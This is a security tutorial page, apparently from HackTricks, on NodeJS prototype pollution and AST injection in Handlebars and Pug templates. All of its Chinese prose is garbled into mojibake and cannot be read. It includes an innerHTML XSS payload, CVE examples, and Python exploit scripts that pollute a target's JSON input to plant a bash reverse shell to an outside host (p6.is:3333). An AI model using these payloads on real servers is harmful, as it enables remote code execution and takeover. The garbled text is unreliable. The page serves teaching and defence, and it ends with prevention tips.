# NodeJS - \_\_proto\_\_ & åŸå‹æ±¡æŸ“

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ç›´åˆ°æˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨å¸Œæœ›åœ¨ **HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š** æˆ– **ä¸‹è½½HackTricksçš„PDFç‰ˆæœ¬**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## JavaScriptä¸­çš„å¯¹è±¡ <a href="#053a" id="053a"></a>

é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦ç†è§£JavaScriptä¸­çš„`Object`ã€‚å¯¹è±¡åªæ˜¯é”®å’Œå€¼å¯¹çš„é›†åˆï¼Œé€šå¸¸ç§°ä¸ºè¯¥å¯¹è±¡çš„å±æ€§ã€‚ä¾‹å¦‚ï¼š

![](<../../../.gitbook/assets/image (389) (1).png>)

åœ¨Javascriptä¸­ï¼Œ`Object`æ˜¯ä¸€ä¸ªåŸºæœ¬å¯¹è±¡ï¼Œæ˜¯æ‰€æœ‰æ–°åˆ›å»ºå¯¹è±¡çš„æ¨¡æ¿ã€‚é€šè¿‡å‘`Object.create`ä¼ é€’`null`å¯ä»¥åˆ›å»ºä¸€ä¸ªç©ºå¯¹è±¡ã€‚ç„¶è€Œï¼Œæ–°åˆ›å»ºçš„å¯¹è±¡ä¹Ÿä¼šæœ‰ä¸€ä¸ªå¯¹åº”ä¼ é€’å‚æ•°çš„ç±»å‹ï¼Œå¹¶ç»§æ‰¿æ‰€æœ‰åŸºæœ¬å±æ€§ã€‚
```javascript
console.log(Object.create(null)); // prints an empty object
```
![](<../../../.gitbook/assets/image (360).png>)

ä¹‹å‰æˆ‘ä»¬äº†è§£åˆ°ï¼Œjavascript ä¸­çš„å¯¹è±¡æ˜¯é”®å’Œå€¼çš„é›†åˆï¼Œå› æ­¤ä¸€ä¸ª `null` å¯¹è±¡åªæ˜¯ä¸€ä¸ªç©ºå­—å…¸ï¼š`{}`

## Javascript ä¸­çš„å‡½æ•°/ç±» <a href="#55dd" id="55dd"></a>

åœ¨ Javascript ä¸­ï¼Œç±»å’Œå‡½æ•°çš„æ¦‚å¿µæ˜¯ç›¸å½“ç›¸å…³çš„ï¼ˆå‡½æ•°æœ¬èº«å……å½“ç±»çš„æ„é€ å™¨ï¼Œè€Œå®é™…ä¸Š javascript æ²¡æœ‰â€œç±»â€çš„æ¦‚å¿µï¼‰ã€‚è®©æˆ‘ä»¬çœ‹ä»¥ä¸‹ç¤ºä¾‹ï¼š
```javascript
function person(fullName, age) {
this.age = age;
this.fullName = fullName;
this.details = function() {
return this.fullName + " has age: " + this.age;
}
}
```
![](<../../../.gitbook/assets/image (361).png>)
```javascript
var person1 = new person("Satoshi", 70);
```
![](<../../../.gitbook/assets/image (362).png>)

## JavaScript ä¸­çš„åŸå‹ <a href="#3843" id="3843"></a>

éœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯ï¼Œæ‰§è¡Œä»£ç æ—¶å¯ä»¥æ›´æ”¹/ä¿®æ”¹/åˆ é™¤åŸå‹å±æ€§ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥åŠ¨æ€åœ°å‘ç±»æ·»åŠ å‡½æ•°ï¼š

![](<../../../.gitbook/assets/image (363).png>)

ç±»çš„å‡½æ•°ä¹Ÿå¯ä»¥è¢«ä¿®æ”¹ï¼ˆå¦‚ä¸‹ä¾‹ä¸­çš„ `toString` æˆ– `valueOf`ï¼‰ï¼š

![](<../../../.gitbook/assets/image (364).png>)

![](<../../../.gitbook/assets/image (365).png>)

## ç»§æ‰¿

åœ¨åŸºäºåŸå‹çš„ç¨‹åºä¸­ï¼Œå¯¹è±¡ä»ç±»ç»§æ‰¿å±æ€§/æ–¹æ³•ã€‚é€šè¿‡å‘å¦ä¸€ä¸ªç±»çš„å®ä¾‹æ·»åŠ å±æ€§/æ–¹æ³•æˆ–å‘ç©ºå¯¹è±¡æ·»åŠ å±æ€§/æ–¹æ³•æ¥æ´¾ç”Ÿç±»ã€‚

è¯·æ³¨æ„ï¼Œå¦‚æœæ‚¨å‘ç”¨ä½œä¸€ç»„å¯¹è±¡åŸå‹çš„å¯¹è±¡ï¼ˆå¦‚ myPersonObjï¼‰æ·»åŠ å±æ€§ï¼Œåˆ™è¯¥åŸå‹çš„å¯¹è±¡ä¹Ÿä¼šè·å¾—æ–°å±æ€§ï¼Œä½†é™¤éç‰¹åˆ«è°ƒç”¨ï¼Œå¦åˆ™ä¸ä¼šæ‰“å°è¯¥å±æ€§ã€‚

![](<../../../.gitbook/assets/image (366).png>)

## \_\_proto\_\_ æ±¡æŸ“ <a href="#0d0a" id="0d0a"></a>

æ‚¨åº”è¯¥å·²ç»äº†è§£åˆ°**JavaScript ä¸­çš„æ¯ä¸ªå¯¹è±¡éƒ½ä»…ä»…æ˜¯é”®å’Œå€¼å¯¹çš„é›†åˆ**ï¼Œå¹¶ä¸”**æ¯ä¸ªå¯¹è±¡éƒ½ç»§æ‰¿è‡ª JavaScript ä¸­çš„ Object ç±»å‹**ã€‚è¿™æ„å‘³ç€ï¼Œå¦‚æœæ‚¨èƒ½å¤Ÿæ±¡æŸ“ Object ç±»å‹ï¼Œ**ç¯å¢ƒä¸­çš„æ¯ä¸ª JavaScript å¯¹è±¡éƒ½å°†è¢«æ±¡æŸ“ï¼**

è¿™ç›¸å½“ç®€å•ï¼Œæ‚¨åªéœ€è¦èƒ½å¤Ÿä¿®æ”¹ä»»æ„ JavaScript å¯¹è±¡çš„ä¸€äº›å±æ€§ï¼ˆé”®å€¼å¯¹ï¼‰ï¼Œå› ä¸ºæ¯ä¸ªå¯¹è±¡éƒ½ç»§æ‰¿è‡ª Objectï¼Œæ¯ä¸ªå¯¹è±¡éƒ½å¯ä»¥è®¿é—® Object æ–¹æ¡ˆã€‚
```javascript
function person(fullName) {
this.fullName = fullName;
}
var person1 = new person("Satoshi");
```
ä»å‰é¢çš„ä¾‹å­ä¸­ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼è®¿é—®Objectçš„ç»“æ„ï¼š
```javascript
person1.__proto__.__proto__
person.__proto__.__proto__
```
å› æ­¤ï¼Œå¦‚å‰æ‰€è¿°ï¼Œå¦‚æœç°åœ¨å‘Objectæ–¹æ¡ˆæ·»åŠ äº†ä¸€ä¸ªå±æ€§ï¼Œé‚£ä¹ˆæ¯ä¸ªJavaScriptå¯¹è±¡éƒ½å°†èƒ½å¤ è®¿é—®æ–°å±æ€§ï¼š
```javascript
function person(fullName) {
this.fullName = fullName;
}
var person1 = new person("Satoshi");
//Add function as new property
person1.__proto__.__proto__.printHello = function(){console.log("Hello");}
person1.printHello() //This now works and prints hello
//Add constant as new property
person1.__proto__.__proto__.globalconstant = true
person1.globalconstant  //This now works and is "true"
```
## åŸå‹æ±¡æŸ“

è¿™ç§æŠ€æœ¯å¹¶ä¸åƒå‰ä¸€ç§æŠ€æœ¯é‚£æ ·æœ‰æ•ˆï¼Œå› ä¸ºä½ ä¸èƒ½æ±¡æŸ“JSå¯¹è±¡çš„ç»“æ„ã€‚ä½†åœ¨**å…³é”®å­—`__proto__`è¢«ç¦æ­¢çš„æƒ…å†µä¸‹ï¼Œè¿™ç§æŠ€æœ¯å¯èƒ½ä¼šæœ‰ç”¨**ã€‚

å¦‚æœä½ èƒ½å¤Ÿä¿®æ”¹å‡½æ•°çš„å±æ€§ï¼Œä½ å¯ä»¥ä¿®æ”¹å‡½æ•°çš„`prototype`å±æ€§ï¼Œ**ä½ åœ¨è¿™é‡Œæ·»åŠ çš„æ¯ä¸ªæ–°å±æ€§éƒ½ä¼šè¢«è¯¥å‡½æ•°åˆ›å»ºçš„æ¯ä¸ªå¯¹è±¡ç»§æ‰¿ï¼š**
```javascript
function person(fullName) {
this.fullName = fullName;
}
var person1 = new person("Satoshi");
//Add function as new property
person.prototype.sayHello = function(){console.log("Hello");}
person1.sayHello() //This now works and prints hello
//Add constant as new property
person.prototype.newConstant = true
person1.newConstant //This now works and is "true"

//The same could be achieved using this other way:
person1.constructor.prototype.sayHello = function(){console.log("Hello");}
person1.constructor.prototype.newConstant = true
```
åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œåªæœ‰ä»`person`ç±»åˆ›å»ºçš„**å¯¹è±¡**ä¼šå—åˆ°å½±å“ï¼Œä½†å®ƒä»¬ç°åœ¨å°†**ç»§æ‰¿å±æ€§`sayHello`å’Œ`newConstant`**ã€‚

**æœ‰2ç§æ–¹æ³•å¯ä»¥é€šè¿‡åŸå‹æ±¡æŸ“æ¥æ±¡æŸ“æ¯ä¸€ä¸ªJSå¯¹è±¡ã€‚**

ç¬¬ä¸€ç§æ–¹æ³•æ˜¯æ±¡æŸ“**Object**çš„prototypeå±æ€§ï¼ˆå¦‚å‰æ‰€è¿°ï¼Œæ¯ä¸ªJSå¯¹è±¡éƒ½ç»§æ‰¿è‡ªè¿™ä¸ªï¼‰ï¼š
```javascript
Object.prototype.sayBye = function(){console.log("bye!")}
```
å¦‚æœæ‚¨èƒ½å¤Ÿåšåˆ°è¿™ä¸€ç‚¹ï¼Œæ¯ä¸ªJSå¯¹è±¡éƒ½å°†èƒ½å¤Ÿæ‰§è¡Œå‡½æ•°`sayBye`ã€‚

å¦ä¸€ç§æ–¹å¼æ˜¯åƒä¸‹é¢çš„ä¾‹å­ä¸€æ ·ï¼Œå¯¹å­—å…¸å˜é‡çš„æ„é€ å™¨åŸå‹è¿›è¡Œæ±¡æŸ“ï¼š
```javascript
something = {"a": "b"}
something.constructor.prototype.sayHey = function(){console.log("Hey!")}
```
æ‰§è¡Œè¯¥ä»£ç åï¼Œ**æ¯ä¸ªJSå¯¹è±¡éƒ½å°†èƒ½å¤Ÿæ‰§è¡Œå‡½æ•°`sayHey`**ã€‚

## æ±¡æŸ“å…¶ä»–å¯¹è±¡

### ä»ä¸€ä¸ªç±»åˆ°Object.prototype

åœ¨ä¸€ä¸ªä½ å¯ä»¥**æ±¡æŸ“ç‰¹å®šå¯¹è±¡**å¹¶ä¸”éœ€è¦**åˆ°è¾¾`Object.prototype`**çš„åœºæ™¯ä¸­ï¼Œä½ å¯ä»¥ä½¿ç”¨ç±»ä¼¼ä»¥ä¸‹ä»£ç æ¥æœç´¢å®ƒï¼š
```javascript
// From https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/

// Search from "window" object
for(let key of Object.getOwnPropertyNames(window)) {
if (window[key]?.constructor.prototype === Object.prototype) {
console.log(key)
}
}

// Imagine that the original object was document.querySelector('a')
// With this code you could find some attributes to get the object "window" from that one
for(let key1 in document.querySelector('a')) {
for(let key2 in document.querySelector('a')[key1]) {
if (document.querySelector('a')[key1][key2] === window) {
console.log(key1 + "." + key2)
}
}
}
```
### æ•°ç»„å…ƒç´ æ±¡æŸ“

è¯·æ³¨æ„ï¼Œå°±åƒæ‚¨å¯ä»¥åœ¨JSä¸­æ±¡æŸ“å¯¹è±¡çš„å±æ€§ä¸€æ ·ï¼Œå¦‚æœæ‚¨å¯ä»¥æ±¡æŸ“æ•°ç»„ï¼Œæ‚¨ä¹Ÿå¯ä»¥**æ±¡æŸ“é€šè¿‡ç´¢å¼•**è®¿é—®çš„æ•°ç»„çš„**å€¼**ï¼ˆè¯·æ³¨æ„ï¼Œæ‚¨ä¸èƒ½è¦†ç›–å€¼ï¼Œå› æ­¤æ‚¨éœ€è¦æ±¡æŸ“é‚£äº›ä»¥æŸç§æ–¹å¼è¢«ä½¿ç”¨ä½†æœªè¢«å†™å…¥çš„ç´¢å¼•ï¼‰ã€‚
```javascript
c = [1,2]
a = []
a.constructor.prototype[1] = "yolo"
b = []
b[0] //undefined
b[1] //"yolo"
c[1] // 2 -- not
```
### Html å…ƒç´ æ±¡æŸ“

é€šè¿‡ JS ç”Ÿæˆ HTML å…ƒç´ æ—¶ï¼Œå¯ä»¥**è¦†ç›–** **`innerHTML`** å±æ€§ï¼Œä½¿å…¶ç¼–å†™**ä»»æ„ HTML ä»£ç ã€‚** [çµæ„Ÿå’Œç¤ºä¾‹æ¥è‡ªè¿™ç¯‡æ–‡ç« ](https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/).

{% code overflow="wrap" %}
```javascript
// Create element
devSettings["root"] = document.createElement('main')

// Pollute innerHTML
settings[root][innerHTML]=<"svg onload=alert(1)>"

// Pollute innerHTML of the ownerProperty to avoid overwrites of innerHTML killing the payload
settings[root][ownerDocument][body][innerHTML]="<svg onload=alert(document.domain)>"
```
{% endcode %}

## ç¤ºä¾‹

### åŸºç¡€ç¤ºä¾‹

é‚£ä¹ˆåŸå‹æ±¡æŸ“åœ¨å“ªé‡Œå‘ç”Ÿå‘¢ï¼Ÿå½“åº”ç”¨ç¨‹åºä¸­å­˜åœ¨ä¸€ä¸ªé”™è¯¯ï¼Œä½¿å¾—å¯ä»¥é‡å†™`Object.prototype`çš„å±æ€§æ—¶ï¼Œå°±ä¼šå‘ç”ŸåŸå‹æ±¡æŸ“ã€‚ç”±äºæ¯ä¸ªå…¸å‹å¯¹è±¡éƒ½ä»`Object.prototype`ç»§æ‰¿å…¶å±æ€§ï¼Œæˆ‘ä»¬å¯ä»¥æ”¹å˜åº”ç”¨ç¨‹åºçš„è¡Œä¸ºã€‚æœ€å¸¸è§çš„ç¤ºä¾‹æ˜¯ä»¥ä¸‹æƒ…å†µï¼š
```javascript
if (user.isAdmin) {   // do something important!}
```
æƒ³è±¡æˆ‘ä»¬æœ‰ä¸€ä¸ªåŸå‹æ±¡æŸ“ï¼Œå¯ä»¥è®¾ç½® `Object.prototype.isAdmin = true`ã€‚é‚£ä¹ˆï¼Œé™¤éåº”ç”¨ç¨‹åºæ˜ç¡®åˆ†é…äº†ä»»ä½•å€¼ï¼Œå¦åˆ™ `user.isAdmin` æ€»æ˜¯ä¸ºçœŸï¼

![](https://research.securitum.com/wp-content/uploads/sites/2/2019/10/image-1.png)

ä¾‹å¦‚ï¼Œ`obj[a][b] = value`ã€‚å¦‚æœæ”»å‡»è€…å¯ä»¥æ§åˆ¶ `a` å’Œ `value` çš„å€¼ï¼Œé‚£ä¹ˆä»–åªéœ€è¦å°† `a` çš„å€¼è°ƒæ•´ä¸º `__proto__`ï¼ˆåœ¨javascriptä¸­ï¼Œ`obj["__proto__"]` å’Œ `obj.__proto__` æ˜¯å®Œå…¨ç­‰ä»·çš„ï¼‰ï¼Œç„¶ååº”ç”¨ç¨‹åºä¸­æ‰€æœ‰ç°æœ‰å¯¹è±¡çš„å±æ€§ `b` å°†è¢«åˆ†é…ç»™ `value`ã€‚

ç„¶è€Œï¼Œæ”»å‡»å¹¶ä¸åƒä¸Šé¢é‚£æ ·ç®€å•ï¼Œæ ¹æ®[è®ºæ–‡](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)ï¼Œæˆ‘ä»¬åªèƒ½åœ¨æ»¡è¶³ä»¥ä¸‹ä¸‰ä¸ªæ¡ä»¶ä¹‹ä¸€æ—¶è¿›è¡Œæ”»å‡»ï¼š

* æ‰§è¡Œé€’å½’åˆå¹¶
* é€šè¿‡è·¯å¾„å®šä¹‰å±æ€§
* å…‹éš†å¯¹è±¡

### è¦†ç›–å‡½æ•°
```python
customer.__proto__.toString = ()=>{alert("polluted")}
```
### åŸå‹æ±¡æŸ“åˆ°è¿œç¨‹ä»£ç æ‰§è¡Œ

{% content-ref url="prototype-pollution-to-rce.md" %}
[prototype-pollution-to-rce.md](prototype-pollution-to-rce.md)
{% endcontent-ref %}

## å®¢æˆ·ç«¯åŸå‹æ±¡æŸ“åˆ°XSS

{% content-ref url="client-side-prototype-pollution.md" %}
[client-side-prototype-pollution.md](client-side-prototype-pollution.md)
{% endcontent-ref %}

### CVE-2019â€“11358ï¼šé€šè¿‡jQuery $ .extendè¿›è¡Œçš„åŸå‹æ±¡æŸ“æ”»å‡»

å¦‚æœå¤„ç†ä¸å½“ï¼Œ$ .extendå¯ä»¥æ”¹å˜å¯¹è±¡`prototype`ï¼ˆåº”ç”¨ä¸­å¯¹è±¡çš„æ¨¡æ¿ï¼‰çš„å±æ€§ã€‚è¿™ä¸ªå±æ€§éšåä¼šå‡ºç°åœ¨æ‰€æœ‰å¯¹è±¡ä¸Šã€‚æ³¨æ„ï¼Œåªæœ‰â€œæ·±åº¦â€ç‰ˆæœ¬ï¼ˆå³gï¼‰çš„$ .extendå—åˆ°å½±å“ã€‚

ç¨‹åºå‘˜ç»å¸¸ä½¿ç”¨è¿™ä¸ªå‡½æ•°æ¥å¤åˆ¶ä¸€ä¸ªå¯¹è±¡æˆ–ä»é»˜è®¤å¯¹è±¡å¡«å……æ–°å±æ€§ã€‚ä¾‹å¦‚ï¼š

æˆ‘ä»¬å¯ä»¥æƒ³è±¡`myObject`æ˜¯ç”¨æˆ·çš„è¾“å…¥å­—æ®µï¼Œå¹¶è¢«åºåˆ—åŒ–åˆ°æ•°æ®åº“ä¸­ï¼‰

åœ¨è¿™æ®µä»£ç ä¸­ï¼Œæˆ‘ä»¬é€šå¸¸è®¤ä¸ºï¼Œè¿è¡Œæ—¶ä¼šå°†å±æ€§`isAdmin`åˆ†é…åˆ°æ–°åˆ›å»ºçš„å¯¹è±¡ä¸­ã€‚ä½†å®é™…ä¸Šï¼Œå®ƒæ˜¯ç›´æ¥åˆ†é…ç»™`{}`çš„ï¼Œç„¶å`{}.isAdmin`å°†ä¼šæ˜¯`true`ã€‚å¦‚æœåœ¨è¿™æ®µä»£ç ä¹‹åï¼Œæˆ‘ä»¬æ‰§è¡Œä»¥ä¸‹æ£€æŸ¥ï¼š
```javascript
If (user.isAdmin === true) {
// do something for admin
}
```
å¦‚æœç”¨æˆ·å°šä¸å­˜åœ¨ï¼ˆ`undefined`ï¼‰ï¼Œåˆ™ä¼šåœ¨å…¶çˆ¶å¯¹è±¡ä¸­æœç´¢å±æ€§`isAdmin`ï¼Œå³ä¸Šé¢æ·»åŠ äº†å€¼ä¸º`true`çš„`isAdmin`çš„Objectã€‚

åœ¨JQuery 3.3.1ä¸Šæ‰§è¡Œæ—¶çš„å¦ä¸€ä¸ªä¾‹å­ï¼š
```javascript
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'))
console.log({}.devMode); // true
```
è¿™äº›é”™è¯¯å¯èƒ½ä¼šå½±å“è®¸å¤šJavaScripté¡¹ç›®ï¼Œå°¤å…¶æ˜¯NodeJSé¡¹ç›®ï¼Œæœ€å®é™…çš„ä¾‹å­æ˜¯2018å¹´12æœˆMongooseä¸­çš„é”™è¯¯ï¼ŒMongooseæ˜¯ä¸€ä¸ªå¸®åŠ©æ“ä½œMongoDBçš„JSåº“ã€‚

### CVE-2018â€“3721, CVE-2019â€“10744ï¼šé€šè¿‡lodashè¿›è¡ŒåŸå‹æ±¡æŸ“æ”»å‡»

[Lodash](https://www.npmjs.com/package/lodash) ä¹Ÿæ˜¯ä¸€ä¸ªè‘—åçš„åº“ï¼Œæä¾›äº†è®¸å¤šä¸åŒçš„åŠŸèƒ½ï¼Œå¸®åŠ©æˆ‘ä»¬æ›´æ–¹ä¾¿ã€æ›´æ•´æ´åœ°ç¼–å†™ä»£ç ï¼Œæ¯å‘¨ä¸‹è½½é‡è¶…è¿‡1900ä¸‡æ¬¡ã€‚å®ƒå’ŒJQueryæœ‰ç€åŒæ ·çš„é—®é¢˜ã€‚

**CVE-2018â€“3721**

**CVE-2019â€“10744**

è¿™ä¸ªæ¼æ´å½±å“äº†Lodashçš„æ‰€æœ‰ç‰ˆæœ¬ï¼Œå·²åœ¨4.17.11ç‰ˆæœ¬ä¸­ä¿®å¤ã€‚

### å¦ä¸€ä¸ªå¸¦æœ‰CVEsçš„æ•™ç¨‹

{% embed url="https://infosecwriteups.com/javascript-prototype-pollution-practice-of-finding-and-exploitation-f97284333b2" %}

## ASTåŸå‹æ±¡æŸ“

åœ¨NodeJSä¸­ï¼ŒASTåœ¨JSä¸­éå¸¸å¸¸ç”¨ï¼Œå¦‚æ¨¡æ¿å¼•æ“å’Œtypescriptç­‰ã€‚\
å¯¹äºæ¨¡æ¿å¼•æ“ï¼Œç»“æ„å¦‚ä¸Šå›¾æ‰€ç¤ºã€‚

![img](https://blog.p6.is/img/2020/08/graph_3.jpg)

### Handlebars

ä¿¡æ¯å–è‡ª[https://blog.p6.is/AST-Injection/](https://blog.p6.is/AST-Injection/)

æ‚¨å¯ä»¥å°†ä»»ä½•å­—ç¬¦ä¸²æ’å…¥`Object.prototype.pendingContent`æ¥ç¡®å®šæ”»å‡»çš„å¯èƒ½æ€§ã€‚\
è¿™å…è®¸æ‚¨ç¡®ä¿¡ï¼Œåœ¨é»‘ç›’ç¯å¢ƒä¸­å­˜åœ¨åŸå‹æ±¡æŸ“æ—¶ï¼ŒæœåŠ¡å™¨æ­£åœ¨ä½¿ç”¨handlebarså¼•æ“ã€‚
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js -->

...
appendContent: function appendContent(content) {
if (this.pendingContent) {
content = this.pendingContent + content;
} else {
this.pendingLocation = this.source.currentLocation;
}

this.pendingContent = content;
},
pushSource: function pushSource(source) {
if (this.pendingContent) {
this.source.push(this.appendToBuffer(this.source.quotedString(this.pendingContent), this.pendingLocation));
this.pendingContent = undefined;
}

if (source) {
this.source.push(source);
}
}
...
```
**åˆ©ç”¨**

![img](https://blog.p6.is/img/2020/08/graph_5.jpg)

Handlebars çš„å·¥ä½œæµç¨‹å¦‚ä¸Šå›¾æ‰€ç¤ºã€‚

åœ¨è¯æ³•åˆ†æå™¨å’Œè§£æå™¨ç”Ÿæˆ AST ä¹‹åï¼Œå®ƒä¼šä¼ é€’ç»™ `compiler.js`\
æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸€äº›å‚æ•°è¿è¡Œæ¨¡æ¿å‡½æ•°ç¼–è¯‘å™¨ç”Ÿæˆçš„å†…å®¹ã€‚å®ƒä¼šè¿”å›ç±»ä¼¼äº â€œHello posixâ€ çš„å­—ç¬¦ä¸²ï¼ˆå½“ msg æ˜¯ posix æ—¶ï¼‰ã€‚
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js -->

case 36:
this.$ = { type: 'NumberLiteral', value: Number($$[$0]), original: Number($$[$0]), loc: yy.locInfo(this._$) };
break;
```
è§£æå™¨åœ¨ handlebars ä¸­å¼ºåˆ¶ç±»å‹ä¸º NumberLiteral çš„èŠ‚ç‚¹çš„å€¼å§‹ç»ˆé€šè¿‡ Number æ„é€ å‡½æ•°æ˜¯ä¸€ä¸ªæ•°å­—ã€‚ç„¶è€Œï¼Œæ‚¨å¯ä»¥ä½¿ç”¨åŸå‹æ±¡æŸ“åœ¨æ­¤å¤„æ’å…¥ä¸€ä¸ªéæ•°å­—å­—ç¬¦ä¸²ã€‚
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/base.js -->

function parseWithoutProcessing(input, options) {
// Just return if an already-compiled AST was passed in.
if (input.type === 'Program') {
return input;
}

_parser2['default'].yy = yy;

// Altering the shared object here, but this is ok as parser is a sync operation
yy.locInfo = function (locInfo) {
return new yy.SourceLocation(options && options.srcName, locInfo);
};

var ast = _parser2['default'].parse(input);

return ast;
}

function parse(input, options) {
var ast = parseWithoutProcessing(input, options);
var strip = new _whitespaceControl2['default'](options);

return strip.accept(ast);
}
```
é¦–å…ˆï¼ŒæŸ¥çœ‹ compile å‡½æ•°ï¼Œå®ƒæ”¯æŒä¸¤ç§è¾“å…¥æ–¹å¼ï¼ŒAST å¯¹è±¡å’Œæ¨¡æ¿å­—ç¬¦ä¸²ã€‚

å½“ input.type æ˜¯ `Program` æ—¶ï¼Œå°½ç®¡è¾“å…¥å€¼å®é™…ä¸Šæ˜¯å­—ç¬¦ä¸²ã€‚\
è§£æå™¨è®¤ä¸ºå®ƒå·²ç»æ˜¯ç”± parser.js è§£æçš„ ASTï¼Œå¹¶å°†å…¶å‘é€ç»™ç¼–è¯‘å™¨ï¼Œè€Œä¸è¿›è¡Œä»»ä½•å¤„ç†ã€‚
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js -->

...
accept: function accept(node) {
/* istanbul ignore next: Sanity code */
if (!this[node.type]) {
throw new _exception2['default']('Unknown type: ' + node.type, node);
}

this.sourceNode.unshift(node);
var ret = this[node.type](node);
this.sourceNode.shift();
return ret;
},
Program: function Program(program) {
console.log((new Error).stack)
this.options.blockParams.unshift(program.blockParams);

var body = program.body,
bodyLength = body.length;
for (var i = 0; i < bodyLength; i++) {
this.accept(body[i]);
}

this.options.blockParams.shift();

this.isSimple = bodyLength === 1;
this.blockParams = program.blockParams ? program.blockParams.length : 0;

return this;
}
```
ç¼–è¯‘å™¨æ¥æ”¶åˆ° AST å¯¹è±¡ï¼ˆå®é™…ä¸Šæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼‰ï¼Œå°†å…¶å‘é€åˆ° `accept` æ–¹æ³•ã€‚\
`accept` è°ƒç”¨ç¼–è¯‘å™¨çš„ `this[node.type]`ã€‚\
ç„¶åå– AST çš„ body å±æ€§ï¼Œç”¨äºæ„å»ºå‡½æ•°ã€‚
```javascript
const Handlebars = require('handlebars');

Object.prototype.type = 'Program';
Object.prototype.body = [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "console.log(process.mainModule.require('child_process').execSync('id').toString())"
}],
"loc": {
"start": 0,
"end": 0
}
}];


const source = `Hello {{ msg }}`;
const template = Handlebars.precompile(source);

console.log(eval('(' + template + ')')['main'].toString());

/*
function (container, depth0, helpers, partials, data) {
var stack1, lookupProperty = container.lookupProperty || function (parent, propertyName) {
if (Object.prototype.hasOwnProperty.call(parent, propertyName)) {
return parent[propertyName];
}
return undefined
};

return ((stack1 = (lookupProperty(helpers, "undefined") || (depth0 && lookupProperty(depth0, "undefined")) || container.hooks.helperMissing).call(depth0 != null ? depth0 : (container.nullContext || {}), console.log(process.mainModule.require('child_process').execSync('id').toString()), {
"name": "undefined",
"hash": {},
"data": data,
"loc": {
"start": 0,
"end": 0
}
})) != null ? stack1 : "");
}
*/
```
å› æ­¤ï¼Œæ”»å‡»å¯ä»¥è¿™æ ·é…ç½®ã€‚å¦‚æœæ‚¨å·²ç»æ£€æŸ¥äº†è§£æå™¨ï¼Œè¯·æŒ‡å®šä¸€ä¸ªä¸èƒ½èµ‹ç»™NumberLiteralå€¼çš„å­—ç¬¦ä¸²ã€‚ä½†æ˜¯ä¸€æ—¦å¤„ç†äº†æ³¨å…¥çš„ASTï¼Œæˆ‘ä»¬å¯ä»¥å°†ä»»ä½•ä»£ç æ’å…¥åˆ°å‡½æ•°ä¸­ã€‚

**ç¤ºä¾‹**

[https://github.com/hughsk/flat/issues/105](https://github.com/hughsk/flat/issues/105)
```python
import requests

TARGET_URL = 'http://p6.is:3000'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.type": "Program",
"__proto__.body": [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}],
"loc": {
"start": 0,
"end": 0
}
}]
})

# execute
requests.get(TARGET_URL)
```
### Pug

æ›´å¤šä¿¡æ¯è¯·è§ [https://blog.p6.is/AST-Injection/#Pug](https://blog.p6.is/AST-Injection/#Pug)
```python
import requests

TARGET_URL = 'http://p6.is:3000'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.block": {
"type": "Text",
"line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}
})

# execute
requests.get(TARGET_URL)
```
## å¦‚ä½•é¢„é˜²ï¼Ÿ

* ä½¿ç”¨ Object.freeze å†»ç»“å±æ€§ï¼ˆObject.prototypeï¼‰
* æ ¹æ®åº”ç”¨ç¨‹åºçš„æ¨¡å¼å¯¹ JSON è¾“å…¥è¿›è¡ŒéªŒè¯
* é¿å…ä¸å®‰å…¨åœ°ä½¿ç”¨é€’å½’åˆå¹¶å‡½æ•°
